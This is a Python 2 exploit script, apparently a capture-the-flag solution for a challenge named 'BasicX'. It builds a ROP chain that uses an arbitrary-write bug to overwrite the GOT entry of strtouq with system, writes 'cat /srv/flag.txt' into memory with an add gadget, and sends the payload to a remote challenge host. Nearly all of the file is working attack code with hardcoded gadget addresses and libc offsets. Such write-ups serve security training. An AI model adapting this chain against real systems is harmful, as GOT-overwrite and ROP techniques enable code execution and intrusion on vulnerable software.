#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# BasicX: 300 points, 20 solves
# Keywords: arbitrary write, ROP, ALSR, GOT dereference, shutdown socket
# ROP util a shells pops, that's the spirit :D

def baseN(num,b,numerals):
    return ((num == 0) and numerals[0]) or (baseN(num // b, b, numerals).lstrip(numerals[0]) + numerals[num % b])

def get_pair(addr, content):
    base = [chr(i) for i in range(48, 79)]
    payload = "{0:020}".format(addr << 32)

    d = baseN(content, len(base),base)
    d = "0" * (20 - len(d)) + d

    return d + payload

pop_rbx_rbp = 0x0040075f #: pop rbx ; pop rbp ; ret  ;  (1 found)
pop_rdi = 0x004008f3 # : pop rdi ; ret  ;  (1 found)
add_rbp_ebx = 0x00000000004005f8 #Â : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; re
GOT_strtouq = 0x000000601030
rw_memory = 0x601050
# remote
strtouq = 0x38ee0
system = 0x41cd0
# local
# strtouq = 0x39150
# system = 0x41fa0

diff_to_system = system - strtouq

def split(data, size):
    i = 0
    while i < len(data):
        yield data[i:i+size].ljust(4, ' ')
        i += size

def payload():
    i = 517
    yield i, 0xffffffffffffffff; i += 1
    # Overwrite GOT entry of strtouq with system
    yield i, pop_rbx_rbp; i += 1
    yield i, diff_to_system; i += 1
    yield i, (GOT_strtouq + 0x3d); i += 1
    yield i, add_rbp_ebx; i += 1

    # write 4 bytes 4 by 4 using the add_rbp_ebx gadget
    for offset, i_cmd in enumerate(split('cat /srv/flag.txt', 4)):
        yield i, pop_rbx_rbp; i += 1
        yield i, int(i_cmd[::-1].encode('hex')*2, 16); i += 1
        yield i, (rw_memory + 0x3d + 4 * offset); i += 1
        yield i, add_rbp_ebx; i += 1

    # Setup rdi to point to the command // system(cmd)
    yield i, pop_rdi; i += 1
    yield i, rw_memory; i += 1
    yield i, 0x0000000000400530 # strtoul_plt
    i += 1
    yield i, 0xffffffffffffffff

payload = ''.join([ get_pair(a, b) for a, b in payload() ])
print(payload)

import socket
# s = socket.create_connection(("localhost", 4242))
s = socket.create_connection(("basex.challs.malice.fr", 4444))

s.send(payload.encode())
s.shutdown(socket.SHUT_WR)
print(s.recv(4096))
